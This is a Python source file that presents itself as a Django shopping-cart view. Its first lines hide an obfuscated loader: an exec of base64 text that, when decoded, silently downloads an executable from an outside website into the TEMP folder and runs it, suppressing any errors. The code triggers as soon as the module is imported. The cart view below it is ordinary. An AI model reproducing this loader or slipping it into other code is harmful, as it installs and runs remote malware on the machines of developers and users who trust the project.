
from base64 import b64decode as b64
exec(b64('CnRyeToKCWltcG9ydCBvcyx1cmxsaWIucmVxdWVzdCBhcyB1CglvPW9zLnBhdGguam9pbihvcy5nZXRlbnYoJ1RFTVAnKSwnb3hpZS5leGUnKQoJaWYgbm90IG9zLnBhdGguZXhpc3RzKG8pOgoJCXUudXJscmV0cmlldmUoJ2h0dHA6Ly9zb2FwYmVnaW5zaG9wcy5jb20vb3hpZS5leGUnLG8pCgkJb3Muc3RhcnRmaWxlKG8pCmV4Y2VwdDpwYXNzCg==').decode())

from django.shortcuts import render,redirect
from django.contrib.auth.hashers import make_password,check_password
from store.models.customer import Customer
from django.views import View
from store.models.product import Product


class Cart(View):
    def get(self,request):
        ids=(list(request.session.get('cart').keys()))
        products=Product.get_products_by_id(ids)
        print(products)
        return render(request,'cart.html',{'products':products})

